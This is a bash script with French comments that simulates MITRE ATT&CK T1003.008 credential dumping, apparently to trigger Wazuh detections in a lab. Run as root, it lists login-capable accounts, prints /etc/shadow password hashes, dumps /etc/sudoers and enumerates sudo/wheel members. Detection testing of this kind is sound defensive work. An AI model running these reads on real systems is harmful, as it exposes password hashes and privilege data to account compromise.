#!/bin/bash
# ──────────────────────────────────────────────────────────────────
# MITRE ATT&CK : T1003.008 — OS Credential Dumping: /etc/passwd & /etc/shadow
# Technique    : Lecture des hashes de mots de passe locaux
# Génère       : Wazuh auditd (si configuré) + syscheck sur /etc/shadow
# Run depuis   : Cible (Wazuh VM) — root requis pour /etc/shadow
# Usage        : sudo bash 08_credential_access.sh
# ──────────────────────────────────────────────────────────────────

echo "[*] Lecture /etc/passwd — comptes avec shell valide"
grep -v "nologin\|false\|sync\|halt\|shutdown" /etc/passwd \
    | awk -F: '{print $1, $3, $6, $7}'

echo ""
echo "[*] Lecture /etc/shadow — hashes des mots de passe"
if [ "$(id -u)" -eq 0 ]; then
    cat /etc/shadow | head -20
    echo ""
    echo "[*] Comptes avec hash actif (pas vide, pas verouillé)"
    awk -F: '($2 != "!" && $2 != "*" && $2 != "" && $2 != "x") {print "[+]", $1}' /etc/shadow
else
    echo "[-] Accès refusé — relancer avec sudo"
fi

echo ""
echo "[*] Lecture /etc/sudoers — configuration des privilèges"
cat /etc/sudoers 2>/dev/null | grep -v "^#\|^$" | head -20 \
    || echo "[-] Accès refusé"

echo ""
echo "[*] Groupe sudo/wheel — utilisateurs avec privilèges élevés"
getent group sudo wheel 2>/dev/null
